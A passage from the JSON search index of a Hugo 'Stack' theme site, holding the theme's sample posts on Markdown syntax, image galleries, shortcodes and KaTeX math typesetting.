\u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] One line code block 1 \u0026lt;p\u0026gt;A paragraph\u0026lt;/p\u0026gt; List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL + ALT + Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nThe above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2023-09-07T00:00:00Z","permalink":"https://bu44er.ink/p/markdown-syntax-guide/","title":"Markdown Syntax Guide"},{"content":"Hugo theme Stack supports the creation of interactive image galleries using Markdown. It\u0026rsquo;s powered by PhotoSwipe and its syntax was inspired by Typlog.\nTo use this feature, the image must be in the same directory as the Markdown file, as it uses Hugo\u0026rsquo;s page bundle feature to read the dimensions of the image. External images are not supported.\nSyntax 1 ![Image 1](1.jpg) ![Image 2](2.jpg) Result Photo by mymind and Luke Chesser on Unsplash\n","date":"2023-08-26T00:00:00Z","image":"https://bu44er.ink/p/image-gallery/2_hu_3e58a979f20e4e46.jpg","permalink":"https://bu44er.ink/p/image-gallery/","title":"Image gallery"},{"content":"For more details, check out the documentation.\nBilibili video Tencent video YouTube video Generic video file Your browser doesn't support HTML5 video. Here is a link to the video instead. Gist GitLab Quote Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n― A famous person, The book they wrote Photo by Codioful on Unsplash\n","date":"2023-08-25T00:00:00Z","image":"https://bu44er.ink/p/shortcodes/cover_hu_5667347daefb4230.jpg","permalink":"https://bu44er.ink/p/shortcodes/","title":"Shortcodes"},{"content":"Stack has built-in support for math typesetting using KaTeX.\nIt\u0026rsquo;s not enabled by default side-wide, but you can enable it for individual posts by adding math: true to the front matter. Or you can enable it side-wide by adding math = true to the params.article section in config.toml.\nInline math This is an inline mathematical expression: $\\varphi = \\dfrac{1+\\sqrt5}{2}= 1.6180339887…$\n1 $\\varphi = \\dfrac{1+\\sqrt5}{2}= 1.6180339887…$ Block math $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$ 1 2 3 $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$ $$ f(x) = \\int_{-\\infty}^\\infty\\hat f(\\xi)\\,e^{2 \\pi i \\xi x}\\,d\\xi $$ 1 2 3 $$ f(x) = \\int_{-\\infty}^\\infty\\hat f(\\xi)\\,e^{2 \\pi i \\xi x}\\,d\\xi $$ ","date":"2023-08-24T00:00:00Z","permalink":"https://bu44er.ink/p/math-typesetting/","title":"Math Typesetting"}]